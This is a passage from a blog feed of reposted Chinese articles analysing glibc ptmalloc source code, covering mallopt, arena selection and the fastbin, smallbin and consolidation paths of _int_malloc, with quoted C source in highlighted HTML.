mp_.arena_test = value;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_ARENA_MAX:<br>        <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_arena_max, <span class="hljs-number">2</span>, value, mp_.arena_max);<br>            mp_.arena_max = value;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    (<span class="hljs-type">void</span>) <span class="hljs-built_in">mutex_unlock</span>(&amp;av-&gt;mutex);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-built_in">libc_hidden_def</span>( __libc_mallopt)<br></code></pre></td></tr></table></figure><p>首先通过<code>__malloc_initialized</code>判断如果ptmalloc还未初始化，就调用<code>ptmalloc_init</code>进行初始化。<code>malloc_consolidate</code>用来将fast bins中的chunk合并，并且里面会初始化主分配区，后面的章节会分析到这个函数。然后就根据传入的<code>param_number</code>设置<code>mp_</code>，<code>mp_</code>代表ptmalloc的各个全局参数，其默认定义如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">static struct malloc_par mp_ = &#123; <br>    <span class="hljs-string">.top_pad</span> = DEFAULT_TOP_PAD, <br>    <span class="hljs-string">.n_mmaps_max</span> = DEFAULT_MMAP_MAX, <br>    <span class="hljs-string">.mmap_threshold</span> = DEFAULT_MMAP_THRESHOLD, <br>    <span class="hljs-string">.trim_threshold</span> = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-comment">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>    <span class="hljs-string">.arena_test</span> = NARENAS_FROM_NCORES<span class="hljs-params">(1)</span> <br>&#125;;<br></code></pre></td></tr></table></figure><p>这里不分析里面各个参数的意义，到后面用到时再来分析。<code>malloc_hook_ini</code>最后会回调<code>__libc_malloc</code>函数，这次<code>__malloc_hook</code>为null，因此继续看下面的代码。</p><h2 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h2><p>接下来通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在arena.c中，</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">#define arena_get(<span class="hljs-built_in">ptr</span>, size) <span class="hljs-keyword">do</span> &#123; \<br>      arena_lookup (<span class="hljs-built_in">ptr</span>);                             \<br>      arena_lock (<span class="hljs-built_in">ptr</span>, size);                             \<br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><code>arena_lookup</code>从私有变量里获取分配区指针，</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#define arena_lookup(ptr) <span class="hljs-keyword">do</span> &#123; \<br>      <span class="hljs-literal">void</span> *vptr = <span class="hljs-built_in">NULL</span>;                              \<br>      ptr = (mstate) tsd_getspecific (arena_key, vptr);               \<br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><code>tsd_getspecific</code>也是个宏定义，就是获取前面调用<code>tsd_setspecific</code>设置的分配区指针，这里取出的可能是主分配去指针，也可能是非主分配去指针，然后调用<code>arena_lock</code>对<code>malloc_state</code>中的<code>mutex</code>加锁。</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gml">#define arena_lock(<span class="hljs-built_in">ptr</span>, size) <span class="hljs-keyword">do</span> &#123;                        \<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ptr</span> &amp;&amp; !arena_is_corrupt (<span class="hljs-built_in">ptr</span>))                     \<br>        (void) mutex_lock (&amp;<span class="hljs-built_in">ptr</span>-&gt;mutex);                      \<br>      <span class="hljs-keyword">else</span>                                    \<br>        <span class="hljs-built_in">ptr</span> = arena_get2 (<span class="hljs-built_in">ptr</span>, (size), NULL);                     \<br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获得分配去的指针后，就会调用<code>_int_malloc</code>开始分配内存了，下一章分析这个函数。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://wiki-prog.infoprepa.epita.fr/images/0/04/Malloc_tutorial.pdf">https://wiki-prog.infoprepa.epita.fr/images/0/04/Malloc_tutorial.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析——3</title>
    <link href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%943/"/>
    <url>/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%943/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>的前面一小部分，本章继续往下看，</p><h1 id="int-malloc-—-fastbin"><a href="#int-malloc-—-fastbin" class="headerlink" title="_int_malloc — fastbin"></a>_int_malloc — fastbin</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * _int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (<span class="hljs-built_in">get_max_fast</span> ())) &#123;<br>        idx = <span class="hljs-built_in">fastbin_index</span>(nb);<br>        mfastbinptr *fb = &amp;<span class="hljs-built_in">fastbin</span>(av, idx);<br>        mchunkptr pp = *fb;<br>        <span class="hljs-keyword">do</span> &#123;<br>            victim = pp;<br>            <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">while</span> ((pp = <span class="hljs-built_in">catomic_compare_and_exchange_val_acq</span>(fb, victim-&gt;fd, victim))<br>                != victim);<br>        <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (__builtin_expect(<span class="hljs-built_in">fastbin_index</span> (<span class="hljs-built_in">chunksize</span> (victim)) != idx, <span class="hljs-number">0</span>)) &#123;<br>                errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>                errout: <span class="hljs-built_in">malloc_printerr</span>(check_action, errstr, <span class="hljs-built_in">chunk2mem</span>(victim),<br>                        av);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<span class="hljs-built_in">check_remalloced_chunk</span> (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>            <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>get_max_fast</code>返回fastbin可以存储内存的最大值，它在ptmalloc的初始化函数<code>malloc_init_state</code>中定义，后面会分析这个函数。<br>如果需要分配的内存大小nb落在fastbin的范围内，首先调用<code>fastbin_index</code>获得chunk大小<code>nb</code>对应的fastbin索引。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">fastbin_index</span>(sz) \<br>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>减2是根据fastbin存储的内存最小值计算的，本章假设<code>SIZE_SZ=4</code>，因此改写后<code>idx = nb/8-2</code>。<br>获得索引idx后，就通过fastbin取出空闲chunk链表指针，<code>mfastbinptr</code>其实就是<code>malloc_chunk</code>指针，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">fastbin</span>(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY<span class="hljs-selector-attr">[idx]</span>)<br></code></pre></td></tr></table></figure><p>下面的do、while循环又是一个CAS操作，其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)。这里注意，fastbin中使用的是单链表，而后面smallbin使用的是双链表。<br>获得空闲chunk后，需要转换为可以存储的内存指针，<code>chunk2mem</code>上一章分析过了，就是返回<code>malloc_chunk</code>结构中fd所在的位置，因为当一个chunk被使用时，<code>malloc_chunk</code>结构中<code>fd</code>、<code>bk</code>包括后面的变量都没有用了。最后调用<code>alloc_perturb</code>对用户使用的内存进行初始化，然后就返回该内存的指针了。<br>假设fastbin中没有找到空闲chunk，或者fastbin根本没有初始化，或者其他原因，就进入下一步，从smallbin中获取内存，因此继续往下看.</p><h1 id="int-malloc-—-smallbin-largebin"><a href="#int-malloc-—-smallbin-largebin" class="headerlink" title="_int_malloc — smallbin &amp; largebin"></a>_int_malloc — smallbin &amp; largebin</h1><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void * _int_malloc(mstate av, size_t bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb)) &#123;<br>        idx = smallbin_index(nb);<br>        bin = bin_at (av, idx);<br><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) &#123;<br>            <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>)<br>                malloc_consolidate(av);<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br>                <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely(bck-&gt;</span>fd != victim)) &#123;<br>                    errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                    goto errout;<br>                &#125;<br>                set_inuse_bit_at_offset(victim, nb);<br>                <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>                <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>size |= NON_MAIN_ARENA;<br>                check_malloced_chunk (av, victim, nb);<br>                void *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                return p;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        idx = largebin_index(nb);<br>        <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>            malloc_consolidate(av);<br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">in_smallbin_range</span>(sz)  \<br>  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)<br></code></pre></td></tr></table></figure><p>基于本章假设，<code>MIN_LARGE_SIZE</code>经过换算后为512字节，因此低于512字节大小的内存块都归smallbin管理。<br>接下来通过<code>bin_at</code>获得smallbin空闲chunk链表指针，</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define bin_at(m, i) \</span><br>  <span class="hljs-function"><span class="hljs-params">(mbinptr)</span> <span class="hljs-params">(((char *) &amp;((m)-&gt;bins[((i) - <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>]))               <span class="hljs-string">\</span></span></span><br><span class="hljs-params"><span class="hljs-function">             - offsetof (struct malloc_chunk, fd))</span></span><br></code></pre></td></tr></table></figure><p>这里乘2，并且减去fd相对于<code>malloc_chunk</code>中的位置是因为smallbin中存储的是fd和bk指针。<br><code>last</code>定义为</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define last(<span class="hljs-name">b</span>)      ((<span class="hljs-name">b</span>)-&gt;bk)<br></code></pre></td></tr></table></figure><p>该函数获得chunk的前一个chunk，由因为该chunk是smallbin的链表头，因此获得的是最后一个chunk，如果两者相等，表示对应的链表为空，什么都不做。<br>这里假设不相等，接下来有两种情况，第一种是<code>victim=0</code>，表示smallbin还没有初始化，这里需要特别说明一下这里。smallbin初始化为<code>malloc_chunk</code>指针数组，虽然定义为指针数组，但实际上存储的是fd和bk指针，如下所示<br>|fd|bk|fd|bk|…|fd|bk|<br>当smallbin还未初始化时，假设<code>idx=1</code>，根据<code>bin_at</code>取出的<code>bin</code>是一个虚拟的<code>malloc_chunk</code>指针，<code>bin-&gt;fd</code>，是第二个fd，因此<code>bin-&gt;bk</code>就是对应的bk，其值为0（bin-&gt;bk取出的不是地址，而是值）。因此当<code>victim</code>为0时，可以断定smallbin未初始化，此时调用<code>malloc_consolidate</code>进行初始化，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">malloc_consolidate</span>(<span class="hljs-params">mstate av</span>) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br><br>        ...<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">malloc_init_state</span>(av);<br>        <span class="hljs-title function_">check_malloc_state</span>(av);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>省略代码的if语句里是将fastbin中的chunk进行合并，然后添加到bins中，这里不分析，因为还未初始化，因此<code>get_max_fast</code>返回0，后面的章节碰到了再分析。进入else部分，<code>check_malloc_state</code>为空函数，<code>malloc_init_state</code>就是主要的初始化函数，</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> malloc_init_state(mstate av) &#123;<br>    int i;<br>    mbinptr bin;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i) &#123;<br>        bin = bin_at (av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin;<br>    &#125;<br><br><span class="hljs-comment">#if MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-comment">#endif</span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    av-&gt;flags |= FASTCHUNKS_BIT;<br><br>    av-&gt;top = initial_top (av);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数做了四件事情，第一是初始化<code>malloc_state</code>中的<code>bins</code>数组，初始化的结果是对<code>bins</code>数组中的每一个<code>fd</code>和对应的<code>bk</code>，都初始化为<code>fd</code>的地址，即<code>fd=bk=&amp;fd</code>；第二是设置fastbin可管理的内存块的最大值，即<code>global_max_fast</code>，<code>DEFAULT_MXFAST</code>定义为，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br></code></pre></td></tr></table></figure><p>本章假设为64，<code>set_max_fast</code>定义为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#define set_max_fast(s) \</span><br>  global_max_fast = (((s) == <span class="hljs-number">0</span>)                           \<br>                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) <span class="hljs-meta">&amp; ~MALLOC_ALIGN_MASK))</span><br></code></pre></td></tr></table></figure><p>第三是设置一些标志位；第四是初始化分配去中的top chunk，就是一个<code>malloc_chunk</code>指针，<code>fd</code>保存在<code>bins[0]</code>中（smallbin中不使用<code>bins[0]</code>和<code>bins[1]</code>）。<br>重新回到<code>_int_malloc</code>中，假设<code>victim</code>不为0，下面就从双向链表中取出<code>victim</code>，设置其中的标志位，然后返回用户可分配的内存指针。<br>假设smallbin中没有空闲chunk可用，下面就要开始寻找largebin了，<code>largebin_index</code>定义为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define largebin_index(sz) \</span><br>  (SIZE_SZ == <span class="hljs-number">8</span> ? largebin_index_64 (sz)                                     <span class="hljs-string">\</span><br>   : MALLOC_ALIGNMENT == <span class="hljs-number">16</span> ? largebin_index_32_big (sz)                     <span class="hljs-string">\</span><br>   : largebin_index_32 (sz))<br></code></pre></td></tr></table></figure><p>根据前面<code>SIZE_SZ</code>的假设，这里<code>largebin_index</code>对应的就是<code>largebin_index_32</code>，定义为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr">#define largebin_index_32</span><span class="hljs-comment">(sz)</span>                                                \<br>  <span class="hljs-comment">(((((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">6</span>) &lt;= <span class="hljs-number">38</span>) ?  <span class="hljs-number">56</span> + <span class="hljs-comment">(((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">6</span>) :\<br>   <span class="hljs-comment">((((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">9</span>) &lt;= <span class="hljs-number">20</span>) ?  <span class="hljs-number">91</span> + <span class="hljs-comment">(((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">9</span>) :\<br>   <span class="hljs-comment">((((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;= <span class="hljs-number">10</span>) ? <span class="hljs-number">110</span> + <span class="hljs-comment">(((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">12</span>) :\<br>   <span class="hljs-comment">((((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">15</span>) &lt;= <span class="hljs-number">4</span>) ? <span class="hljs-number">119</span> + <span class="hljs-comment">(((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">15</span>) :\<br>   <span class="hljs-comment">((((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">18</span>) &lt;= <span class="hljs-number">2</span>) ? <span class="hljs-number">124</span> + <span class="hljs-comment">(((unsigned long)</span> <span class="hljs-comment">(sz)</span>) &gt;&gt; <span class="hljs-number">18</span>) :\<br>   <span class="hljs-number">126</span>)<br></code></pre></td></tr></table></figure><p>这里就不多解释了，如果需要知道sz和索引的对应关系，可以自己计算一下。<br>再接下来<code>have_fastchunks</code>根据标志位判断fastbin中是否有空闲chunk，如果有，就调用<code>malloc_consolidate</code>将这些chunk和并，然后加入到unsortedbin中。</p><h1 id="int-malloc-—-合并fastbin"><a href="#int-malloc-—-合并fastbin" class="headerlink" title="_int_malloc — 合并fastbin"></a>_int_malloc — 合并fastbin</h1><p>下面重新看一下<code>malloc_consolidate</code>函数。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void malloc_consolidate(mstate av) &#123;<br>    mfastbinptr* fb;<br>    mfastbinptr* maxfb;<br>    mchunkptr p;<br>    mchunkptr nextp;<br>    mchunkptr unsorted_bin;<br>    mchunkptr first_unsorted;<br><br>    mchunkptr nextchunk;<br>    INTERNAL_SIZE_T size;<br>    INTERNAL_SIZE_T nextsize;<br>    INTERNAL_SIZE_T prevsize;<br>    int nextinuse;<br>    mchunkptr bck;<br>    mchunkptr fwd;<br><br>    <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>        clear_fastchunks(av);<br>        unsorted_bin = unsorted_chunks(av);<br><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    <span class="hljs-function"><span class="hljs-title">nextp</span> = p-&gt;</span>fd;<br><br>                    <span class="hljs-function"><span class="hljs-title">size</span> = p-&gt;</span>size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">prevsize</span> = p-&gt;</span>prev_size;<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((long ) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-function"><span class="hljs-title">if</span> (nextchunk != av-&gt;</span>top) &#123;<br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>                        <span class="hljs-function"><span class="hljs-title">first_unsorted</span> = unsorted_bin-&gt;</span>fd;<br>                        <span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>fd = p;<br>                        <span class="hljs-function"><span class="hljs-title">first_unsorted</span>-&gt;</span>bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd_nextsize = NULL;<br>                            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk_nextsize = NULL;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk = unsorted_bin;<br>                        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br><br>                    <span class="hljs-keyword">else</span> &#123;<br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        <span class="hljs-function"><span class="hljs-title">av</span>-&gt;</span>top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br><br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        ...<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为ptmalloc前面已经初始化过了，这里直接进入if内部，首先通过<code>clear_fastchunks</code>设置标志位表示fastbin中存在空闲chunk，</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define clear_fastchunks(<span class="hljs-name">M</span>)    catomic_or (<span class="hljs-name">&amp;</span>(<span class="hljs-name">M</span>)-&gt;flags, FASTCHUNKS_BIT)<br></code></pre></td></tr></table></figure><p>然后通过<code>unsorted_chunks</code>获得bins数组中unsortedbin对应的<code>malloc_chunk</code>指针（其<code>fd</code>和<code>bk</code>指针对应<code>bins[0]</code>和<code>bins[1]</code>）。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define unsorted_chunks(<span class="hljs-name">M</span>)          (<span class="hljs-name">bin_at</span> (<span class="hljs-name">M</span>, <span 